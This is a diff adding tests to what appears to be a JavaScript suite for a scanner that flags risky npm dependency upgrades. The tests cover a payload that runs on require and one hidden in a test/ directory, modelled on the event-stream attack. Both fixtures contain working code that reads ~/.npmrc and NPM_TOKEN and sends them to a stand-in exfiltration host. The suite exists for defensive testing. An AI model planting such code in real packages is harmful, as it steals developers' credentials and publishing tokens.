@@ -135,3 +135,54 @@ describe('what escalates on a routine dependency upgrade', () => {
     }
   });
 });
+
+// The two attack shapes that survive npm 12 blocking install scripts by
+// default. Neither involves a lifecycle script at all, so a tool scoped to
+// install scripts reports nothing on either. Verified against
+// npm-script-lens 1.16.0: it reports the first fixture as "no risky
+// install-time behavior".
+describe('attack shapes with no install script', () => {
+  test('a payload that runs on require is caught as an escalation', () => {
+    const tmp = mkTmpDir('runtime-payload');
+    const before = scan(tmp, 'v1', { name: 'helper', version: '3.1.0' }, {
+      'index.js': 'module.exports = { f: (x) => x };\n',
+    });
+    const after = scan(tmp, 'v2', { name: 'helper', version: '3.1.1' }, {
+      'index.js': [
+        "const fs = require('fs');",
+        "const https = require('https');",
+        "const creds = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');",
+        "https.request('https://collector.example-exfil.net/x', { method: 'POST' }).end(creds + process.env.NPM_TOKEN);",
+        'module.exports = { f: (x) => x };',
+        '',
+      ].join('\n'),
+    });
+    const report = diffManifests(before, after);
+    assert.equal(report.escalated, true);
+    assert.ok(report.newRiskFlags.some((f) => f.startsWith('HIGH')));
+  });
+
+  // flatmap-stream, the event-stream attack, hid its payload in a test
+  // directory precisely because that directory was absent from the GitHub
+  // repo, so the published tarball differed from the reviewable source.
+  // Skipping test/ made this fixture pass the gate with exit 0.
+  test('a payload hidden in a test directory is still scanned', () => {
+    const tmp = mkTmpDir('test-dir-payload');
+    const before = scan(tmp, 'v1', { name: 'streamy', version: '0.1.0' }, {
+      'index.js': 'module.exports = (f) => f;\n',
+    });
+    const after = scan(tmp, 'v2', { name: 'streamy', version: '0.1.1' }, {
+      'index.js': 'module.exports = (f) => f;\n',
+      'test/data.js': [
+        "const fs = require('fs');",
+        "const https = require('https');",
+        "const creds = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');",
+        "https.request('https://collector.example-exfil.net/x').end(creds + process.env.NPM_TOKEN);",
+        '',
+      ].join('\n'),
+    });
+    assert.equal(after.capabilities.sensitiveTargets.present, true, 'test/ must be scanned');
+    const report = diffManifests(before, after);
+    assert.equal(report.escalated, true);
+  });
+});
